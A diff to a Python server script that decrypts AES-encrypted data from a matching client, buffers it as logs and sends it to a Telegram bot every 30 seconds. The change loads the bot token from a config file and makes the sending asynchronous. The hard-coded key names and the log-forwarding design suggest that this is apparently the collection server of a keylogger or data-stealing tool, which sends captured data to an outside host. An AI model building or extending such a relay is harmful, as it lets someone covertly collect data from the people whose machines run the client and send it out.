@@ -6,13 +6,32 @@ from Crypto.Util.Padding import unpad
 import threading
 import time
 from telegram import Bot
+import os
+import asyncio
 
 AES_KEY = b"AfterLifeDeath00"  # 16 bytes, must match client
 AES_IV = b"AfterDeathLife00"  # 16 bytes, must match client
 
-# === TELEGRAM CONFIG ===
-TELEGRAM_TOKEN = "YOUR_BOT_TOKEN"
-TELEGRAM_CHAT_ID = "YOUR_CHAT_ID"
+loop = asyncio.new_event_loop()
+asyncio.set_event_loop(loop)
+
+# === LOAD TELEGRAM CONFIG FROM FILE ===
+def load_telegram_config(path=None):
+    if path is None:
+        path = os.path.join(os.path.dirname(__file__), "../../Telegram.cfg")
+    token = None
+    chat_id = None
+    with open(path, "r", encoding="utf-8") as f:
+        for line in f:
+            if "bot token:" in line:
+                token = line.split("bot token:")[1].strip()
+            elif "chat id:" in line:
+                chat_id = line.split("chat id:")[1].strip()
+    if not token or not chat_id:
+        raise ValueError("Telegram token or chat id not found in config file.")
+    return token, chat_id
+
+TELEGRAM_TOKEN, TELEGRAM_CHAT_ID = load_telegram_config()
 bot = Bot(token=TELEGRAM_TOKEN)
 log_buffer = []
 
@@ -29,11 +48,15 @@ PORT = 5000
 
 def send_buffer_periodically():
     while True:
-        time.sleep(60)
+        time.sleep(30)
         if log_buffer:
             try:
                 message = ''.join(log_buffer)
-                bot.send_message(chat_id=TELEGRAM_CHAT_ID, text=message or "[Empty]")
+                future = asyncio.run_coroutine_threadsafe(
+                    bot.send_message(chat_id=TELEGRAM_CHAT_ID, text=message or "[Empty]"),
+                    loop
+                )
+                future.result()
                 log_buffer.clear()
             except Exception as e:
                 print(f"[TELEGRAM ERROR] {e}")
@@ -66,5 +89,6 @@ def main():
             time.sleep(2)
 
 if __name__ == "__main__":
+    threading.Thread(target=loop.run_forever, daemon=True).start()
     threading.Thread(target=send_buffer_periodically, daemon=True).start()
     main()
